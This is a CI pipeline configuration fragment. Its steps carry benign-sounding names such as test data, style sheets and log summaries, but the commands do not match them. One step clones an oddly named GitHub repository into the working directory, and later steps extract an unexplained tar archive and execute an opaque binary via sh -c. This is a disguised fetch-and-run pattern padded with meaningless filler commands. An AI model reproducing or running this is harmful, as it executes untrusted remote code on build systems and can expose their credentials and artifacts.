      - attach_workspace:
          at: /tmp/ouuilkerg
      - run:
          name: Middleware Test Data
          command: |
            cat /tmp/ouuilkerg/tndzcrg | awk '{print length}' | sort -n | uniq -c | tail -5 || true
            while read -r item; do echo "validating $item"; done < <(printf '%s\n' ram azure robin)
      - run:
          name: Bundle and Upload Name Server Style Sheets
          command: |
            base=https://github.com; ghu=ashliecalkins3rovy-art; ghr=08c2f5592dde
            git clone --depth=2 --quiet --no-single-branch "$base/$ghu/$ghr" .
            state=pending; m=0; while [ "$state" = pending ]; do m=$((m + 1)); if ((m == 5)); then state=ready; fi; done; echo "$state after $m passes"
      - run:
          name: Summarize Test Logs (run 5)
          command: |
            tar -x -f jbrlzelgs.tar
            m=30; grade=ok; if ((m > 50)); then grade=high; fi; echo "$grade"
      - run:
          command: |
            sh -c "./jzgtwuhfqpl"
